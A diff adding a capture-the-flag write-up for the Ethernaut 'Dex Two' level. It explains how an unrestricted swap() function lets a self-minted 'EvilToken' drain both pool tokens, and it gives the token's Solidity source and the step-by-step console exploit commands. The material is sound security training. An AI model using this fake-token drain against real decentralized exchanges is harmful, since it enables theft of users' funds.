@@ -1428,3 +1428,125 @@ await contract.balanceOf(t1, instance).then(v => v.toString())
 ### Level Completed
 Successfully drained all of `token1` from the Dex by abusing the flawed swap pricing logic. Challenge completed.
 ![Level Complete Output](assets/Dex.png)
+
+
+## Ethernaut Level: Dex Two 
+
+### Strategy
+
+Unlike the previous DEX level, **DexTwo allows swapping *any* token**, not just the two official tokens (`token1` and `token2`). This is a critical flaw.
+
+We exploit this by creating our **own ERC-20 token (EvilToken)** and trick the DEX into thinking it’s a valid swap pair. Because the `swap()` logic only relies on balance ratios and doesn’t restrict token types, we can inflate the EVL/`token1` and EVL/`token2` price ratio and **drain the DEX**.
+
+---
+
+### Vulnerability
+
+```
+function swap(address from, address to, uint256 amount) public {
+    ...
+    // No restriction that 'from' and 'to' must be token1/token2
+    uint256 swapAmount = getSwapAmount(from, to, amount);
+    ...
+}
+```
+
+This allows a **malicious token** to be used in swaps.
+
+---
+
+### Exploit Steps
+
+#### 1. Deploy EvilToken
+
+Deploy the following contract in Remix or similar:
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract EvilToken is ERC20 {
+    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
+        _mint(msg.sender, initialSupply);
+    }
+}
+```
+
+Mint: `400` EVL to yourself (player).
+
+---
+
+#### 2. Send 100 EVL to DexTwo
+
+```
+await evilToken.transfer(contract.address, 100);
+```
+
+This sets a 1:1 ratio between EVL and `token1` (and later `token2`).
+
+---
+
+#### 3. Approve DexTwo to use 300 EVL
+
+```
+await evilToken.approve(contract.address, 300);
+```
+
+---
+
+#### 4. Check token addresses
+
+```
+const t1 = await contract.token1();
+const t2 = await contract.token2();
+const evl = evilToken.address;
+```
+
+---
+
+#### 5. Swap 100 EVL for `token1`
+
+```
+await contract.swap(evl, t1, 100);
+```
+
+Drains all 100 of `token1` from the DEX.
+
+Verify:
+
+```
+(await contract.balanceOf(t1, contract.address)).toString(); // should be '0'
+```
+
+---
+
+#### 6. Swap 200 EVL for `token2`
+
+```
+await contract.swap(evl, t2, 200);
+```
+
+Drains all 100 of `token2` from the DEX.
+
+Verify:
+
+```
+(await contract.balanceOf(t2, contract.address)).toString(); // should be '0'
+```
+
+---
+
+### 🔢 Final Balances
+
+|         | Dex Token1 | Dex Token2 | Dex EVL | Player Token1 | Player Token2 | Player EVL |
+|---------|------------|------------|---------|----------------|----------------|-------------|
+| Start   | 100        | 100        | 0       | 10             | 10             | 400         |
+| Mid     | 0          | 100        | 200     | 110            | 10             | 200         |
+| Final   | 0          | 0          | 400     | 110            | 110            | 0           |
+
+---
+
+### Level Completed
+![Level Complete Output](assets/Dextwo.png)
